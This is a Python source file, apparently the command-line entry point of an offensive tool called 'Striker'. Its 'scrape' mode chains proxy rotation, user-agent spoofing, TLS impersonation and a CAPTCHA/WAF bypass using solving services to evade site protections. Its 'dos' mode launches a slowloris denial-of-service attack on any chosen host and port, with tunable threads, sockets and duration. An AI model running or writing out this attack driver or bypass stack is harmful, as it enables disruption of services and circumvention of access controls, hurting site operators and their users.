from __future__ import annotations
import argparse
import logging
import time
from typing import Any, Dict, Iterable, List, Optional
from proxy.proxy_rotator import ProxyRotator
from identity.user_agent_rotator import UserAgentRotator
from policies.delay_jitter import DelayJitter, RateLimiter
from policies.adaptive_backoff import AdaptiveBackoff
from scraping.request_fragmenter import RequestFragmenter
from protection_bypass.captcha_waf_bypass import CaptchaWafBypass
from workers.distributed_bots import WorkerPool, BotContext, Task

logger = logging.getLogger("app")
if not logger.handlers:
    h = logging.StreamHandler()
    h.setFormatter(logging.Formatter("[%(asctime)s] %(levelname)s - %(message)s"))
    logger.addHandler(h)
    logger.setLevel(logging.INFO)


class ScrapingStack:
    def __init__(self,
                 proxies: Optional[List[str]] = None,
                 proxy_file: Optional[str] = None,
                 proxy_rotation: str = "round-robin",
                 user_agents: Optional[List[str]] = None,
                 ua_file: Optional[str] = None,
                 ua_rotation: str = "random",
                 min_delay: float = 0.4,
                 max_delay: float = 2.5,
                 jitter_mode: str = "human",
                 rate_max_calls: int = 5,
                 rate_period: float = 1.0,
                 backoff_strategy: str = "adaptive",
                 backoff_max_delay: float = 120.0,
                 captcha_service: str = "capsolver",
                 captcha_api_key: Optional[str] = None,
                 use_tls_impersonation: bool = True,
                 use_browser_fallback: bool = True,
                 headless: bool = True,
                 chunk_size: int = 64 * 1024,
                 params_per_request: int = 5,
                 verbose: bool = False):
        self.verbose = verbose
        if verbose:
            logger.setLevel(logging.DEBUG)

        if proxies or proxy_file:
            self.proxy_rotator: Optional[ProxyRotator] = ProxyRotator(
                proxies=proxies, proxy_file=proxy_file, rotation=proxy_rotation,
            )
        else:
            self.proxy_rotator = None

        self.ua_rotator = UserAgentRotator(
            user_agents=user_agents, ua_file=ua_file, rotation=ua_rotation,
        )
        self.jitter = DelayJitter(min_delay=min_delay, max_delay=max_delay, mode=jitter_mode)
        self.rate_limiter = RateLimiter(max_calls=rate_max_calls, period=rate_period)
        self.backoff = AdaptiveBackoff(
            strategy=backoff_strategy, max_delay=backoff_max_delay, verbose=verbose,
        )
        self.fragmenter = RequestFragmenter(
            chunk_size=chunk_size,
            max_params_per_request=params_per_request,
            proxy_rotator=self.proxy_rotator,
            ua_rotator=self.ua_rotator,
            jitter=self.jitter,
            rate_limiter=self.rate_limiter,
            backoff=self.backoff,
        )
        self.bypass = CaptchaWafBypass(
            captcha_service=captcha_service,
            captcha_api_key=captcha_api_key,
            proxy_rotator=self.proxy_rotator,
            ua_rotator=self.ua_rotator,
            jitter=self.jitter,
            rate_limiter=self.rate_limiter,
            backoff=self.backoff,
            use_tls_impersonation=use_tls_impersonation,
            use_browser_fallback=use_browser_fallback,
            headless=headless,
            verbose=verbose,
        )

        logger.info(
            "ScrapingStack ready (proxies=%s, ua=%d, captcha=%s, browser=%s)",
            bool(self.proxy_rotator), len(self.ua_rotator.user_agents),
            bool(captcha_api_key), use_browser_fallback,
        )

    def fetch(self, method: str, url: str, **kwargs) -> Any:
        return self.bypass.request(method, url, **kwargs)

    def get(self, url: str, **kwargs):
        return self.fetch("GET", url, **kwargs)

    def post(self, url: str, **kwargs):
        return self.fetch("POST", url, **kwargs)

    def fetch_many(self, urls: Iterable[str], workers: int = 4,
                   handler: Optional[Any] = None, shard_by: str = "host",
                   on_result: Optional[Any] = None, on_error: Optional[Any] = None,
                   progress_every: float = 5.0) -> Dict[str, Any]:
        if handler is None:
            handler = _default_scraping_handler
        pool = WorkerPool(
            tasks=list(urls), handler=handler, num_workers=workers,
            shard_by=shard_by, proxy_rotator=self.proxy_rotator,
            ua_rotator=self.ua_rotator, jitter=self.jitter,
            rate_limiter=self.rate_limiter, backoff=self.backoff,
            on_result=on_result, on_error=on_error, verbose=self.verbose,
        )
        pool.install_signal_handlers()
        return pool.run(progress_every=progress_every)

    def upload_chunked(self, url: str, payload: Any,
                       method: str = "POST", **kwargs) -> List[Any]:
        return self.fragmenter.upload_in_chunks(url, payload, method, **kwargs)

    def paginate(self, url: str, **kwargs) -> List[Any]:
        return self.fragmenter.paginate(url, **kwargs)

    def split_params(self, url: str, params: Dict[str, Any], **kwargs) -> List[Any]:
        return self.fragmenter.split_params(url, params, **kwargs)

    def stats(self) -> Dict[str, Any]:
        return {
            "backoff": self.backoff.stats(),
            "proxies": {
                "total": len(self.proxy_rotator.proxies) if self.proxy_rotator else 0,
                "bad": list(self.proxy_rotator._permanent_bad) if self.proxy_rotator else [],
            },
            "user_agents_count": len(self.ua_rotator.user_agents),
            "current_ua": self.ua_rotator.current,
        }

    def close(self) -> None:
        try:
            self.bypass.close()
        except Exception:
            pass


def _default_scraping_handler(task: Task, ctx: BotContext) -> Dict[str, Any]:
    import requests
    sess = requests.Session()
    try:
        resp = ctx.request(sess, "GET", task.url, timeout=20)
        status = getattr(resp, "status_code", None)
        if status in (403, 429, 503):
            ctx.mark_current_proxy_bad(reason=f"HTTP {status}")
        return {
            "url": task.url,
            "status": status,
            "size": len(getattr(resp, "text", "") or ""),
            "worker": ctx.worker_id,
        }
    finally:
        sess.close()


def _run_dos(args) -> None:
    from application.dos import Dos
    dos = Dos(
        target_ip=args.host,
        target_port=args.port,
        threads=args.threads,
        sockets_per_worker=args.sockets_per_thread,
        keepalive_interval=args.interval,
    )
    logger.info("DoS target %s:%d (%d threads x %d sockets)",
                args.host, args.port, args.threads, args.sockets_per_thread)
    dos.run()
    t0 = time.time()
    try:
        while time.time() - t0 < args.duration:
            time.sleep(5)
            s = dos.stats()
            logger.info("alive=%d opened=%d closed=%d errors=%s",
                        s["alive_sockets"], s["opened"],
                        s["closed"], s["errors"])
    except KeyboardInterrupt:
        logger.info("interrupted")
    finally:
        dos.stop()
        time.sleep(1)
        logger.info("done.")


def _build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Striker CLI")
    sub = p.add_subparsers(dest="cmd", required=True)

    sc = sub.add_parser("scrape", help="Stealth scraping of URLs")
    sc.add_argument("urls", nargs="*")
    sc.add_argument("--urls-file")
    sc.add_argument("--proxies-file")
    sc.add_argument("--ua-file")
    sc.add_argument("--workers", type=int, default=4)
    sc.add_argument("--captcha-key", default=None)
    sc.add_argument("--captcha-service", default="capsolver",
                    choices=["capsolver", "2captcha", "anticaptcha"])
    sc.add_argument("--no-browser", action="store_true")
    sc.add_argument("--no-tls", action="store_true")
    sc.add_argument("--min-delay", type=float, default=0.4)
    sc.add_argument("--max-delay", type=float, default=2.5)
    sc.add_argument("--verbose", action="store_true")

    ds = sub.add_parser("dos", help="Offensive module (slowloris)")
    ds.add_argument("host")
    ds.add_argument("-p", "--port", type=int, default=80)
    ds.add_argument("-t", "--threads", type=int, default=10)
    ds.add_argument("-s", "--sockets-per-thread", type=int, default=50)
    ds.add_argument("-i", "--interval", type=float, default=15.0)
    ds.add_argument("-d", "--duration", type=int, default=60)

    return p


def _cmd_scrape(args) -> None:
    urls: List[str] = list(args.urls or [])
    if args.urls_file:
        with open(args.urls_file) as f:
            urls.extend(l.strip() for l in f if l.strip() and not l.startswith("#"))
    if not urls:
        print("No URL.")
        return

    stack = ScrapingStack(
        proxy_file=args.proxies_file, ua_file=args.ua_file,
        min_delay=args.min_delay, max_delay=args.max_delay,
        captcha_service=args.captcha_service, captcha_api_key=args.captcha_key,
        use_tls_impersonation=not args.no_tls,
        use_browser_fallback=not args.no_browser,
        verbose=args.verbose,
    )
    try:
        stats = stack.fetch_many(urls, workers=max(1, args.workers))
        print(f"\nDuration: {stats['duration']:.2f}s | "
              f"ok={stats['total_done']} ko={stats['total_failed']}")

        if args.verbose and len(urls) == 1 and stats["results"]:
            r = stats["results"][0]
            print(f"\nURL: {r.url}")
            print(f"Result: {r.result}")
    finally:
        stack.close()


def main() -> None:
    args = _build_parser().parse_args()
    if args.cmd == "scrape":
        _cmd_scrape(args)
    elif args.cmd == "dos":
        _run_dos(args)


if __name__ == "__main__":
    main()